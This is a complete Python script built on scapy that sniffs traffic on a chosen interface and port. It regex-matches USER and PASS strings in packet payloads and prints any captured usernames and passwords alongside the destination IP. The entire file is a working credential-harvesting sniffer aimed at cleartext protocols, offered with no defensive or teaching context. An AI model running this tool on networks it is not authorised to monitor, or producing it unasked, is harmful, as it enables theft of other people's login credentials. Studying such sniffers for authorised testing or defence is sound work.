#!/usr/bin/python3

import sys, argparse, re
from scapy.all import *

def sniffer(packet):
    dst = packet.getlayer(IP).dst
    raw = packet.sprintf('%Raw.load%')
    usr = re.findall('(?i)USER(.*)', raw)
    pwd = re.findall('(?i)PASS(.*)', raw)
    if usr:
        print("Found username \"%s\" for \"%s\"" % (usr, dst))
    if pwd:
        print("Found password \"%s\" for \"%s\"" % (pwd, dst))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", help="The interface you want to sniff.", default="eth0", type=str, required=False)
    parser.add_argument("-p", help="The port you want to sniff.", type=int, required=True)
    parser.add_argument("-t", help="The protocol type you want to sniff (tcp, udp). Default: \"tcp\"", default="tcp", choices=["tcp", "udp"], type=str, required=False)
    args = parser.parse_args()

    interface = args.i
    port = args.p
    proto = args.t

    try:
        conf.iface = interface
        filtering = "%s port %i" % (proto, port)
        print("Listening: %s" % filtering)
        while True:
            sniff(filter=filtering, prn=sniffer)
    except KeyboardInterrupt:
        print("Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    main()
